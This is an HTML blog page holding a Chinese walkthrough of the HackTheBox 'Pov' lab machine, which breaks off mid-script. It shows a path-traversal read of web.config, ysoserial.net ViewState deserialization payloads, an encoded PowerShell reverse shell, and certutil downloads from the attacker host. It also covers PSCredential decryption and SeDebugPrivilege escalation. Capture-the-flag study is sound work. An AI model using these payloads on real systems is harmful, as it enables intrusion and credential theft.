@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"sun-zzz.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":200,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="AST.NET框架ViewState参数攻击、LFI本地文件包含漏洞、ysoserial反序列化漏洞、SeDebugPrivilege提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pov">
+<meta property="og:url" content="https://sun-zzz.github.io/article/Pov-HackTheBox.html">
+<meta property="og:site_name" content="rev1ve&#39;s blog">
+<meta property="og:description" content="AST.NET框架ViewState参数攻击、LFI本地文件包含漏洞、ysoserial反序列化漏洞、SeDebugPrivilege提权">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Pov-HackTheBox/image-20240405172354851.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Pov-HackTheBox/image-20240405173617729.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Pov-HackTheBox/image-20240405174707954.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Pov-HackTheBox/image-20240405185300956.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Pov-HackTheBox/image-20240405192312405.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Pov-HackTheBox/image-20240405192620484.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Pov-HackTheBox/image-20240405194230876.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Pov-HackTheBox/image-20240405194432185.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Pov-HackTheBox/image-20240405200822175.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Pov-HackTheBox/image-20240405200949897.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Pov-HackTheBox/image-20240405201600635.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Pov-HackTheBox/image-20240405203424722.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Pov-HackTheBox/image-20240406124840953.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Pov-HackTheBox/image-20240406125030326.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Pov-HackTheBox/image-20240406125219057.png">
+<meta property="article:published_time" content="2024-04-05T08:19:04.000Z">
+<meta property="article:modified_time" content="2024-09-01T14:41:14.846Z">
+<meta property="article:author" content="rev1ve">
+<meta property="article:tag" content="HackTheBox">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="提权">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sun-zzz.github.io/article/Pov-HackTheBox/image-20240405172354851.png">
+
+<link rel="canonical" href="https://sun-zzz.github.io/article/Pov-HackTheBox.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Pov | rev1ve's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">rev1ve's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links" rel="section"><i class="fas fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sun-zzz.github.io/article/Pov-HackTheBox.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="rev1ve">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rev1ve's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Pov
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-04-05 16:19:04" itemprop="dateCreated datePublished" datetime="2024-04-05T16:19:04+08:00">2024-04-05</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-09-01 22:41:14" itemprop="dateModified" datetime="2024-09-01T22:41:14+08:00">2024-09-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/article/Pov-HackTheBox.html" class="post-meta-item leancloud_visitors" data-flag-title="Pov" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/article/Pov-HackTheBox.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/article/Pov-HackTheBox.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>AST.NET框架ViewState参数攻击、LFI本地文件包含漏洞、ysoserial反序列化漏洞、SeDebugPrivilege提权</p>
+<span id="more"></span>
+
+<h1 id="Pov"><a href="#Pov" class="headerlink" title="Pov"></a>Pov</h1><p><strong>信息搜集</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sC -v --min-rate 1000 10.10.11.251</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE    VERSION</span><br><span class="line">80/tcp open  tcpwrapped</span><br><span class="line">|_http-title: pov.htb</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD</span><br></pre></td></tr></table></figure>
+
+<p>我们将域名<code>pov.htb</code>添加到<code>/etc/hosts</code>方便访问</p>
+<p>打开后发现是企业网站，扫出来子域名<code>dev.pov.htb</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost -u http://pov.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:             http://pov.htb</span><br><span class="line">[+] Method:          GET</span><br><span class="line">[+] Threads:         10</span><br><span class="line">[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span><br><span class="line">[+] User Agent:      gobuster/3.6</span><br><span class="line">[+] Timeout:         10s</span><br><span class="line">[+] Append Domain:   true</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in VHOST enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">Found: dev.pov.htb Status: 302 [Size: 152] [--&gt; http://dev.pov.htb/portfolio/]</span><br></pre></td></tr></table></figure>
+
+<p>那么我们修改下<code>/etc/hosts</code>的域名，成功访问</p>
+<p>我们注意到有文件下载功能，尝试文件读取</p>
+<p><img src="/article/Pov-HackTheBox/image-20240405172354851.png"></p>
+<p>但是并不能读取一些常见的敏感文件路径</p>
+<p><img src="/article/Pov-HackTheBox/image-20240405173617729.png"></p>
+<p>我们利用<code>wappalyzer</code>插件扫描出web框架为<code>AST.NET</code>的4.0版本，并且上述请求中的参数也是相关联</p>
+<p><img src="/article/Pov-HackTheBox/image-20240405174707954.png"></p>
+<p>网上搜到<code>如何利用__VIEWSTATE</code> <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter?source=post_page-----7516c938c688--------------------------------">参考文章</a></p>
+<p><strong>什么是 ViewState</strong></p>
+<blockquote>
+<p>ViewState 是 ASP.NET 中用于维护页面和控制网页数据的默认机制。在呈现页面的 HTML 期间，页面的当前状态和回发期间要保留的值将序列化为 base64 编码的字符串。然后，这些字符串将放置在隐藏的 ViewState 字段中。</p>
+</blockquote>
+<p>ViewState 信息可以通过以下属性或其组合来表征：</p>
+<ul>
+<li><p>基数64：当 <code>EnableViewStateMac</code> 和 <code>ViewStateEncryptionMode</code> 属性都设置为 false 时，将使用此格式。</p>
+</li>
+<li><p>Base64 + MAC（消息认证码）已启用：通过将 <code>EnableViewStateMac</code> 属性设置为 true 来实现 MAC 的激活。这为 ViewState 数据提供完整性验证。</p>
+</li>
+<li><p>Base64 + 加密：当 <code>ViewStateEncryptionMode</code> 属性设置为 true 时，将应用加密，以确保 ViewState 数据的机密性。</p>
+</li>
+</ul>
+<p>文章提到在版本<code>4.5</code>以及<code>EnableViewStateMac=true &amp; ViewStateEncryptionMode=false</code>情况下，密钥在<code>web.config</code>文件上</p>
+<p>（由于<code>../</code>被过滤，直接双写绕过）</p>
+<p><img src="/article/Pov-HackTheBox/image-20240405185300956.png"></p>
+<p>web.config</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;system.web&gt;</span><br><span class="line">    &lt;customErrors mode=&quot;On&quot; defaultRedirect=&quot;default.aspx&quot; /&gt;</span><br><span class="line">    &lt;httpRuntime targetFramework=&quot;4.5&quot; /&gt;</span><br><span class="line">    &lt;machineKey decryption=&quot;AES&quot; decryptionKey=&quot;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&quot; validation=&quot;SHA1&quot; validationKey=&quot;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&quot; /&gt;</span><br><span class="line">  &lt;/system.web&gt;</span><br><span class="line">    &lt;system.webServer&gt;</span><br><span class="line">        &lt;httpErrors&gt;</span><br><span class="line">            &lt;remove statusCode=&quot;403&quot; subStatusCode=&quot;-1&quot; /&gt;</span><br><span class="line">            &lt;error statusCode=&quot;403&quot; prefixLanguageFilePath=&quot;&quot; path=&quot;http://dev.pov.htb:8080/portfolio&quot; responseMode=&quot;Redirect&quot; /&gt;</span><br><span class="line">        &lt;/httpErrors&gt;</span><br><span class="line">        &lt;httpRedirect enabled=&quot;true&quot; destination=&quot;http://dev.pov.htb/portfolio&quot; exactDestination=&quot;false&quot; childOnly=&quot;true&quot; /&gt;</span><br><span class="line">    &lt;/system.webServer&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>使用 YSoSerial.Net 攻击 <a target="_blank" rel="noopener" href="https://github.com/pwntester/ysoserial.net">工具链接</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;ping 10.10.14.46&quot; --apppath=&quot;/&quot; --path=&quot;/portfolio/default.aspx&quot; --decryptionalg=&quot;AES&quot; --decryptionkey=&quot;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&quot;</span><br></pre></td></tr></table></figure>
+
+<p>注意：如果有发送参数 <code>_VIEWSTATEGENERATOR</code> ，用 <code>--generator=8E0F0FA3</code> 替换<code>--apppath=&quot;/&quot; --path=&quot;/portfolio/default.aspx&quot;</code>。实际上bp抓包可以看到确实有，但是换成<code>--generator</code>参数却不行</p>
+<p>在windows系统生成payload</p>
+<p><img src="/article/Pov-HackTheBox/image-20240405192312405.png"></p>
+<p>复制到bp上，并且在本地监听tun0（即10.10.14.46）的流量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -i tun0 icmp</span><br></pre></td></tr></table></figure>
+
+<p>成功命令执行</p>
+<p><img src="/article/Pov-HackTheBox/image-20240405192620484.png"></p>
+<p>经过一番尝试，发现bash的反弹shell无法成功，那么猜测是目标机器为windows</p>
+<p>用powershell去弹 <a target="_blank" rel="noopener" href="https://gist.github.com/tothi/ab288fb523a4b32b51a53e542d40fe58#file-mkpsrevshell-py">脚本链接</a></p>
+<p><img src="/article/Pov-HackTheBox/image-20240405194230876.png"></p>
+<p>然后再生成payload放到bp上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANAA2ACIALAAxADAAMgA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&quot; --apppath=&quot;/&quot; --path=&quot;/portfolio/default.aspx&quot; --decryptionalg=&quot;AES&quot; --decryptionkey=&quot;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&quot;</span><br></pre></td></tr></table></figure>
+
+<p>成功反弹shell</p>
+<p><img src="/article/Pov-HackTheBox/image-20240405194432185.png"></p>
+<p>经过一番查找在<code>C:\Users\sfitz\Documents</code>路径下发现有用信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;Objs Version=&quot;1.1.0.1&quot; xmlns=&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&gt;</span><br><span class="line">  &lt;Obj RefId=&quot;0&quot;&gt;</span><br><span class="line">    &lt;TN RefId=&quot;0&quot;&gt;</span><br><span class="line">      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;</span><br><span class="line">      &lt;T&gt;System.Object&lt;/T&gt;</span><br><span class="line">    &lt;/TN&gt;</span><br><span class="line">    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;</span><br><span class="line">    &lt;Props&gt;</span><br><span class="line">      &lt;S N=&quot;UserName&quot;&gt;alaading&lt;/S&gt;</span><br><span class="line">      &lt;SS N=&quot;Password&quot;&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6&lt;/SS&gt;</span><br><span class="line">    &lt;/Props&gt;</span><br><span class="line">  &lt;/Obj&gt;</span><br><span class="line">&lt;/Objs&gt;</span><br></pre></td></tr></table></figure>
+
+<p>利用powershell语法解密将password转换成明文 <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters#secure-string-to-plaintext">参考文章</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cred = Import-CliXml -Path connection.xml; $cred.GetNetworkCredential() | Format-List *</span><br></pre></td></tr></table></figure>
+
+<p>成功得到密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\sfitz\Documents&gt; $cred = Import-CliXml -Path connection.xml; $cred.GetNetworkCredential() | Format-List *</span><br><span class="line">UserName       : alaading</span><br><span class="line">Password       : f8gQ8fynP44ek1m3</span><br><span class="line">SecurePassword : System.Security.SecureString</span><br><span class="line">Domain         : </span><br></pre></td></tr></table></figure>
+
+<p>接下来我们使用RunasCs进行用户切换</p>
+<p>首先切换到Downloads目录，然后下载本地的RunasCs文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://10.10.14.46/RunasCs.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Pov-HackTheBox/image-20240405200822175.png"></p>
+<p>然后切换用户并弹shell到777端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./RunasCs.exe alaading f8gQ8fynP44ek1m3 powershell.exe -r 10.10.14.46:777</span><br></pre></td></tr></table></figure>
+
+<p>重点：这里用<code>powershell</code>弹，如果用<code>cmd.exe</code>到后面会发现没有<code>SeDebugPrivilege</code>权限</p>
+<p><img src="/article/Pov-HackTheBox/image-20240405200949897.png"></p>
+<p>得到user的flag</p>
+<p><img src="/article/Pov-HackTheBox/image-20240405201600635.png"></p>
+<p>查看下当前用户权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Windows\system32&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State   </span><br><span class="line">============================= ============================== ========</span><br><span class="line">SeDebugPrivilege              Debug programs                 Enabled </span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled </span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</span><br></pre></td></tr></table></figure>
+
+<p><strong>SeDebugPrivilege</strong></p>
+<blockquote>
+<p>在Windows操作系统中，SeDebugPrivilege是一种特别强大的权限，可以让持有该权限的进程读取或修改几乎所有其他进程的内存空间，即使是那些以系统或管理员级别运行的进程。在Metasploit框架下，拥有了这个权限，就可以对系统的SAM数据库进行读取</p>
+</blockquote>
+<p>由于靶机<code>SeDebugPrivilege</code>是<code>enabled</code>，所以我们就直接提权就行了</p>
+<p>若要启动该权限，需要执行下面脚本 <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/v/cn/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#qi-yong-suo-you-ling-pai">参考文章</a></p>
+<p>EnableAllTokenPrivs.ps1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## All Credit goes to Lee Holmes (@Lee_Holmes on twitter).  I found the code here https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/</span><br><span class="line">$definition = @&#x27;</span><br><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line">namespace Set_TokenPermission</span><br><span 